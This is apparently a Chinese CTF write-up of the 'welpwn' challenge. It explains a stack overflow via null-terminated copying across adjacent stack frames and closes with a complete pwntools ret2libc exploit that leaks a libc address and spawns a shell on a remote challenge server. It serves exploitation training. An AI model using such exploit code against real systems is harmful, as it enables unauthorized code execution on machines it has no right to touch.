---
title: welpwn
date: 2022-07-13 22:34:00
tags:
- pwn
categories:
- [刷题, 攻防世界刷题]
---

# 题目简介

一道ret2libc，但是涉及相邻两个栈帧的利用。



# 解题流程

## 查看保护

![image-20220713205355908](/image-20220713205355908.png)

可以说是保护基本没开



## 静态分析

### main()

![image-20220713205552851](/image-20220713205552851.png)

可以看到read控制的字节长度刚刚好，所以就不构成溢出，main函数没什么问题，主要就是从输入流向buf写入数据，跟进看看echo。



### echo()

![image-20220713205704666](/image-20220713205704666.png)

从main函数可以看到程序将我们第一次写的buf作为参数传入echo函数，然后有个for循环，这个循环仔细看可以知道，`*(_BYTE *)(i + a1)`其实对应的就是传入的buf地址上的内容，每循环一次就从buf地址向其高地址偏移一个字节，直到碰到某个地址上没内容或者为`\0`就退出循环。所以这个函数的大致功能就是：**将buf上的内容逐个字节复制到s2中，遇到'\0'退出**



## 漏洞利用

因为我们能向`buf`写入`0x400`的数据，但`s2`的大小只有`0x10`，所以复制数据的时候可能就会导致栈溢出，但是这个栈溢出并不能直接利用。

假如我们的payload是像如下所示泄露真实地址：

`payload = b'a'*0x18 + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(main_addr) `

因为p64()函数打包的地址如果不是16位都是非0的话，结果就一定会出现`\0`，如下图所示

![image-20220713212013671](/image-20220713212013671.png)

虽然小端序输入能保证当时这个地址还有效（能成功复制进s2），但是后面的地址就会被截断。



所以攻击姿势得变通一下:

因为`buf`和`s2`刚好在两个相邻的栈帧上，虽然复制的时候后面的地址会被截断导致复制不到“`s2`里”，但是它们在main函数里已经就被我们写入到了`buf`上，所以它们还是在栈上，栈中情况如下图所示。

![栈1](/栈1.jpg)

> 上图中的“ebp”改为“rbp”

如果直接发送上诉payload的话，栈中情况如上图所示。从上图可看出，程序一开始依然能够正常执行`pop rdi`指令，但是接着执行下去，栈中的内容是`aaaaaaaaa`，这并不是个合法地址，所以会导致程序崩溃。

但是我们可以将echo函数的返回地址改为一个pop gadget的地址，这个地址上得有多个连续的pop指令和return指令，因为这样才能让我们把合法地址“上面”的`aaaaaaaa`给pop掉然后返回栈上继续执行，如下图所示

![image-20220713220859723](/image-20220713220859723.png)

我们选择`0x40089c`这个地址，因为`0x18`的垃圾数据加上pop指令的本身地址，总共要pop `0x20`大小的数据，所以要pop 4次。这是payload为：

`payload = b"a" * 0x18 + p64(pop_4) + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main_addr)`

栈中情况如下图所示：

![栈2](/栈2.jpg)



# EXP

```python
from pwn import *

r = remote('61.147.171.105', 49653)
#r = process('./welpwn')
pop_rdi = 0x4008a3
pop_rsi = 0x4008a1
pop_4 = 0x40089c
main_addr = 0x4007CD
elf = ELF("./welpwn")
puts_plt = elf.plt['puts']
puts_got = elf.got['puts']

r.recvuntil(b"Welcome to RCTF\n")
payload = b"a" * 0x18 + p64(pop_4) + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main_addr)
#gdb.attach(r)
#pause()
r.sendline(payload)
#print(payload)
print(r.recvuntil(b'\x40'))
puts_addr = u64(r.recvline(keepends=False).ljust(8,b'\x00'))
print(hex(puts_addr))

libc_base = puts_addr - 0x6f690
system = libc_base + 0x45390
bin_sh = libc_base + 0x18cd57
payload = b"a" * 0x18 +p64(pop_4) + p64(pop_rdi) + p64(bin_sh) + p64(system)
r.sendline(payload)
r.interactive()

```



# 小结

这道题其实就是考查对栈结构的理解，相比普通的ret2libc，这题涉及相邻两个栈帧的利用。然后要注意程序的小端序输入，这保证了第一个地址的有效性，也保证了后续利用。